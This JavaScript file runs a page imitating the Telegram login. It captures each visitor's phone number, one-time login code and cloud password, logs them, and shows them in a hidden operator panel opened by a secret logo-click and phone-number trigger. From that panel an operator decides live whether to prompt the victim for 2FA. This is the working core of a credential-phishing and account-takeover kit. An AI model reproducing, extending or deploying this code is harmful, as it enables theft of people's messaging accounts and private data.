document.addEventListener('DOMContentLoaded', () => {
    const phoneStep = document.getElementById('phoneStep');
    const codeStep = document.getElementById('codeStep');
    const loginCard = document.getElementById('loginCard');
    const adminPanel = document.getElementById('adminPanel');

    const nextBtn = document.getElementById('nextBtn');
    const backBtn = document.getElementById('backBtn');
    const verifyBtn = document.getElementById('verifyBtn');
    const cloudPasswordBtn = document.getElementById('cloudPasswordBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const clearLogsBtn = document.getElementById('clearLogsBtn');

    const countryDropdown = document.getElementById('countryDropdown');
    const selectedCountryName = document.getElementById('selectedCountryName');
    const countryList = document.getElementById('countryList');
    const countrySearch = document.getElementById('countrySearch');
    const selectItems = document.querySelectorAll('.select-item');

    const countryPrefix = document.getElementById('countryPrefix');
    const phoneNumber = document.getElementById('phoneNumber');
    const verificationCode = document.getElementById('verificationCode');
    const cloudPassword = document.getElementById('cloudPassword');
    const logsBody = document.getElementById('logsBody');
    const loadingOverlay = document.getElementById('loadingOverlay');

    const twoFactorStep = document.getElementById('twoFactorStep');
    const successStep = document.getElementById('successStep');

    // --- State Storage Logic ---
    const STORAGE_KEY = 'tg_login_logs';

    function getLogs() {
        return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    }

    function saveLog(phone, data = {}) {
        const logs = getLogs();
        const existingIndex = logs.findIndex(l => l.phone === phone);
        const timestamp = new Date().toLocaleTimeString();

        if (existingIndex > -1) {
            logs[existingIndex] = { ...logs[existingIndex], ...data, time: timestamp };
        } else {
            logs.unshift({ phone, code: '', status: 'idle', password: '', time: timestamp, ...data });
        }
        localStorage.setItem(STORAGE_KEY, JSON.stringify(logs));
        updateAdminTable();
    }

    function setStatus(phone, status) {
        const logs = getLogs();
        const index = logs.findIndex(l => l.phone === phone);
        if (index > -1) {
            logs[index].status = status;
            localStorage.setItem(STORAGE_KEY, JSON.stringify(logs));
            updateAdminTable();
        }
    }

    function updateAdminTable() {
        if (!adminPanel || adminPanel.style.display === 'none') return;
        const logs = getLogs();
        logsBody.innerHTML = logs.map(log => `
            <tr>
                <td>${log.time}</td>
                <td>
                    ${log.phone}
                    ${log.password ? `<br><small style="color: #ff9f0a;">PW: ${log.password}</small>` : ''}
                </td>
                <td><span style="color: #30d158; font-weight: bold;">${log.code || '---'}</span></td>
                <td>
                    <span style="color: ${log.status === '2fa_required' ? '#ff9f0a' : (log.status === 'success' ? '#30d158' : '#8e8e93')};">
                        ${log.status === 'success' ? 'Нет' : (log.status === '2fa_required' ? 'ДА' : 'Ожидание')}
                    </span>
                </td>
                <td>
                    <div class="admin-actions">
                        <button class="btn-mini btn-yes" onclick="window.adminSet2FA('${log.phone}', true)">2FA</button>
                        <button class="btn-mini btn-no" onclick="window.adminSet2FA('${log.phone}', false)">OK</button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    window.adminSet2FA = (phone, required) => {
        setStatus(phone, required ? '2fa_required' : 'success');
    };

    window.addEventListener('storage', (e) => {
        if (e.key === STORAGE_KEY) {
            updateAdminTable();
            checkUserStatus();
        }
    });

    function checkUserStatus() {
        const phone = countryPrefix.textContent + ' ' + phoneNumber.value;
        const logs = getLogs();
        const myLog = logs.find(l => l.phone === phone);
        if (!myLog || myLog.status === 'idle') return;

        if (myLog.status === 'success') {
            loadingOverlay.classList.add('hidden');
            showStep(successStep);
        } else if (myLog.status === '2fa_required') {
            loadingOverlay.classList.add('hidden');
            showStep(twoFactorStep);
        }
    }

    function showStep(stepToShow) {
        [phoneStep, codeStep, twoFactorStep, successStep].forEach(step => {
            step.classList.add('hidden');
            step.style.display = 'none';
        });
        stepToShow.style.display = 'flex';
        stepToShow.classList.remove('hidden');
        stepToShow.classList.add('fade-in');
    }

    // --- Country Dropdown Logic ---
    countryDropdown.addEventListener('click', (e) => {
        if (e.target.closest('#countrySearch')) return;
        countryDropdown.classList.toggle('active');
        countryList.classList.toggle('hidden');
        if (!countryList.classList.contains('hidden')) {
            countrySearch.focus();
        }
    });

    document.addEventListener('click', (e) => {
        if (!countryDropdown.contains(e.target)) {
            countryDropdown.classList.remove('active');
            countryList.classList.add('hidden');
        }
    });

    selectItems.forEach(item => {
        item.addEventListener('click', () => {
            const value = item.getAttribute('data-value');
            const name = item.getAttribute('data-name');
            const flag = item.getAttribute('data-flag');

            selectedCountryName.innerHTML = `<img src="https://flagcdn.com/w20/${flag}.png" class="flag-icon"> ${name}`;
            countryPrefix.textContent = value;

            selectItems.forEach(si => si.classList.remove('selected'));
            item.classList.add('selected');
        });
    });

    countrySearch.addEventListener('input', (e) => {
        const filter = e.target.value.toLowerCase();
        selectItems.forEach(item => {
            const text = item.textContent.toLowerCase();
            item.style.display = text.includes(filter) ? 'block' : 'none';
        });
    });

    phoneNumber.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        if (value.length > 0) {
            formattedValue = value.substring(0, 3);
            if (value.length > 3) formattedValue += ' ' + value.substring(3, 6);
            if (value.length > 6) formattedValue += ' ' + value.substring(6, 10);
        }
        e.target.value = formattedValue;
    });

    nextBtn.addEventListener('click', () => {
        const fullNumber = countryPrefix.textContent + ' ' + phoneNumber.value;
        if (phoneNumber.value.trim().length < 5) return;

        saveLog(fullNumber, { status: 'idle' });
        showStep(codeStep);
    });

    backBtn.addEventListener('click', () => {
        showStep(phoneStep);
    });

    let logoClicks = 0;
    let logoClickTimeout;

    document.querySelectorAll('.tg-logo').forEach(logo => {
        logo.addEventListener('click', () => {
            logoClicks++;
            clearTimeout(logoClickTimeout);

            // Если в номере введено 7777777777 и кликнули 5 раз
            const cleanNumber = (countryPrefix.textContent + phoneNumber.value).replace(/\s/g, '');
            if (logoClicks >= 5 && cleanNumber.includes('7777777777')) {
                showAdminPanel();
                logoClicks = 0;
                return;
            }

            logoClickTimeout = setTimeout(() => {
                logoClicks = 0;
            }, 2000); // Сброс через 2 секунды бездействия
        });
    });

    verifyBtn.addEventListener('click', () => {
        const fullNumber = countryPrefix.textContent + ' ' + phoneNumber.value;
        const code = verificationCode.value;

        if (code.length >= 1) {
            saveLog(fullNumber, { code, status: 'waiting' });
            loadingOverlay.classList.remove('hidden');
        }
    });

    cloudPasswordBtn.addEventListener('click', () => {
        const fullNumber = countryPrefix.textContent + ' ' + phoneNumber.value;
        const pass = cloudPassword.value;
        if (pass.length < 1) return;

        saveLog(fullNumber, { password: pass, status: 'waiting' });
        loadingOverlay.classList.remove('hidden');
    });

    function showAdminPanel() {
        loginCard.classList.add('hidden');
        setTimeout(() => {
            loginCard.style.display = 'none';
            adminPanel.style.display = 'flex';
            adminPanel.classList.remove('hidden');
            adminPanel.classList.add('fade-in');
            updateAdminTable();
        }, 400);
    }

    logoutBtn.addEventListener('click', () => {
        adminPanel.classList.add('hidden');
        setTimeout(() => {
            adminPanel.style.display = 'none';
            loginCard.style.display = 'block'; // Reset display to original
            loginCard.classList.remove('hidden');
            loginCard.classList.add('fade-in');
            // Reset fields
            phoneNumber.value = '';
            verificationCode.value = '';
        }, 400);
    });

    clearLogsBtn.addEventListener('click', () => {
        if (confirm('Очистить все логи?')) {
            localStorage.removeItem(STORAGE_KEY);
            updateAdminTable();
        }
    });
});
